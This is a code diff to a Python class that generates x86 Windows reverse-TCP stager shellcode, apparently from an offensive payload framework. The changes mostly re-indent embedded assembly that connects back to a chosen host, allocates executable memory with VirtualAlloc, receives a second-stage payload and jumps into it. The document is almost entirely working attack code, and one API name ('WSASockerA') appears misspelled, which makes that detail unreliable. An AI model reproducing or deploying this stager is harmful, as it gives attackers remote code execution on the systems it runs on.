@@ -66,25 +66,25 @@ class ReverseTCP(object):
         """
 
         payload = dedent(f"""\
-            init:
-                cld
-                call start
+        init:
+            cld
+            call start
 
-            {self.blocks.x86_api_call()}
+        {self.blocks.x86_api_call()}
 
-            start:
-                pop ebp
+        start:
+            pop ebp
 
-            {self.block_reverse_tcp(
-                host=host,
-                port=port,
-                retries=retries,
-                exit=exit)}
+        {self.block_reverse_tcp(
+            host=host,
+            port=port,
+            retries=retries,
+            exit=exit)}
 
-            {self.block_recv(
-                length=length,
-                reliable=reliable,
-                exit=exit)}
+        {self.block_recv(
+            length=length,
+            reliable=reliable,
+            exit=exit)}
         """)
 
         return self.assembler.assemble('x86', payload)
@@ -104,70 +104,70 @@ class ReverseTCP(object):
         port = "0x%08x" % self.socket.port(port)
 
         block = dedent(f"""\
-            reverse_tcp:
-                push 0x3233
-                push 0x5f327377
-                push esp
-                push {self.text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
-                mov  eax, ebp
-                call eax
+        reverse_tcp:
+            push 0x3233
+            push 0x5f327377
+            push esp
+            push {self.text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+            mov  eax, ebp
+            call eax
 
-                mov  eax, 0x0190
-                sub  esp, eax
-                push esp
-                push eax
-                push {self.text.block_api_hash('ws2_32.dll', 'WSAStartup')}
-                call ebp
+            mov  eax, 0x0190
+            sub  esp, eax
+            push esp
+            push eax
+            push {self.text.block_api_hash('ws2_32.dll', 'WSAStartup')}
+            call ebp
 
-                push {str(retries)}
+            push {str(retries)}
 
-            socket:
-                push {host}
-                push {port}
-                mov  esi, esp
+        socket:
+            push {host}
+            push {port}
+            mov  esi, esp
 
-                push eax
-                push eax
-                push eax
-                push eax
-                inc  eax
-                push eax
-                inc  eax
-                push eax
-                push {self.text.block_api_hash('ws2_32.dll', 'WSASockerA')}
-                call ebp
-                xchg edi, eax
+            push eax
+            push eax
+            push eax
+            push eax
+            inc  eax
+            push eax
+            inc  eax
+            push eax
+            push {self.text.block_api_hash('ws2_32.dll', 'WSASockerA')}
+            call ebp
+            xchg edi, eax
         """)
 
         block += dedent(f"""\
-            connect:
-                push 16
-                push esi
-                push edi
-                push {self.text.block_api_hash('ws2_32.dll', 'connect')}
-                call ebp
+        connect:
+            push 16
+            push esi
+            push edi
+            push {self.text.block_api_hash('ws2_32.dll', 'connect')}
+            call ebp
 
-                test eax, eax
-                jz   success
+            test eax, eax
+            jz   success
 
-                dec dword ptr [esi+8]
-                jnz connect
+            dec dword ptr [esi+8]
+            jnz connect
         """)
 
         if exit:
             block += dedent(f"""\
-                fail:
-                    call exit
+            fail:
+                call exit
             """)
         else:
             block += dedent(f"""\
-                fail:
-                    push {self.text.block_api_hash('kernel32.dll', 'ExitProcess')}
-                    call ebp
+            fail:
+                push {self.text.block_api_hash('kernel32.dll', 'ExitProcess')}
+                call ebp
             """)
 
         block += dedent(f"""\
-            success:
+        success:
         """)
 
         return block
@@ -183,80 +183,81 @@ class ReverseTCP(object):
 
         if length:
             block = dedent(f"""\
-                    push {hex(length)}
-                    pop  esi
+            recv:
+                push {hex(length)}
+                pop  esi
             """)
 
         else:
             block = dedent(f"""\
-                recv:
-                    push 0
-                    push 4
-                    push esi
-                    push edi
-                    push {self.text.block_api_hash('ws2_32.dll', 'recv')}
-                    call ebp
+            recv:
+                push 0
+                push 4
+                push esi
+                push edi
+                push {self.text.block_api_hash('ws2_32.dll', 'recv')}
+                call ebp
             """)
 
             if reliable:
                 block += dedent("""\
-                        cmp eax, 0
-                        jle cleanup
+                    cmp eax, 0
+                    jle cleanup
                 """)
 
             block += dedent("""\
-                    mov esi, [esi]
+                mov esi, [esi]
             """)
 
         block += dedent(f"""\
-                push 0x40
-                push 0x1000
-                push esi
-                push 0
-                push {self.text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
-                call ebp
-                xchg ebx, eax
-                push ebx
+            push 0x40
+            push 0x1000
+            push esi
+            push 0
+            push {self.text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+            call ebp
+            xchg ebx, eax
+            push ebx
 
-            read_more:
-                push 0
-                push esi
-                push ebx
-                push edi
-                push {self.text.block_api_hash('ws2_32.dll', 'recv')}
-                call ebp
+        read_more:
+            push 0
+            push esi
+            push ebx
+            push edi
+            push {self.text.block_api_hash('ws2_32.dll', 'recv')}
+            call ebp
         """)
 
         if reliable:
             block += dedent(f"""\
-                    cmp eax, 0
-                    jge continue
-                    pop eax
-                    push 0x4000
-                    push 0
-                    push eax
-                    push {self.text.block_api_hash('kernel32.dll', 'VirtualFree')}
-                    call ebp
+                cmp eax, 0
+                jge continue
+                pop eax
+                push 0x4000
+                push 0
+                push eax
+                push {self.text.block_api_hash('kernel32.dll', 'VirtualFree')}
+                call ebp
 
-                cleanup:
-                    push edi
-                    push {self.text.block_api_hash('ws2_32.dll', 'closesocket')}
-                    call ebp
+            cleanup:
+                push edi
+                push {self.text.block_api_hash('ws2_32.dll', 'closesocket')}
+                call ebp
 
-                    pop esi
-                    pop esi
-                    dec dword ptr [esp]
+                pop esi
+                pop esi
+                dec dword ptr [esp]
 
-                    jnz cleanup
-                    jmp fail
+                jnz cleanup
+                jmp fail
             """)
 
         block += dedent("""\
-            continue:
-                add ebx, eax
-                sub esi, eax
-                jnz read_more
-                ret
+        continue:
+            add ebx, eax
+            sub esi, eax
+            jnz read_more
+            ret
         """)
 
         if exit:
